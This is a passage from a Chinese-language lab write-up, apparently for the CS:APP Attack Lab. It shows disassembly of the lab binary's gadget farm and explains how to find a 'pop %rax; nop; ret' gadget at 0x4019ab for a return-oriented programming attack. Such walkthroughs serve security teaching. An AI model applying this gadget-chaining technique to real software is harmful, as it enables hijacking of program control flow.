  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop

```

## 开始寻找可用片段
查看下表可以快速查找：
![](https://pic4.zhimg.com/v2-baa41fc5c5e23231ec4d5f3929d319ef_1440w.jpg)
例如想要找 ``pop %rax``汇编代码，可以找到 ``58`` 这个机器码就是对应着  ``pop %rax``。
当然如果用阶段二的办法，在.s文件里面写入想要的汇编代码然后编译和反汇编也是可以的。
例如:
```txt

inc.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	97                   	xchg   %eax,%edi
   2:	c3                   	retq   
```
也是可以知道``pop %rax``对应的是``58``
然后我们在farm.d文件里面查询58可以找到片段之一为：
```txt
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```
可以看到有 ``58 90 c3`` , 对应着是 ``pop %rax , nop , ret``，刚好符合我们的需求。
那么就要找到它的地址，可以看到``4019a7:	8d 87 51 73 58 90  ``这个意思是``8d``这个机器码对应的地址是``4019a7``
那么往后数，``4019a7 + 1 = 4019a8``对应着是``87`` ， ``4019a9``对应着是``51``， ``4019aa``对应着是``73``
以此类推我们要的``58``就是``4019ab``

所有在返回地址中输入``0x4019ab``那么就会跳到``addval_219()``函数片段里面运行``58 90 c3``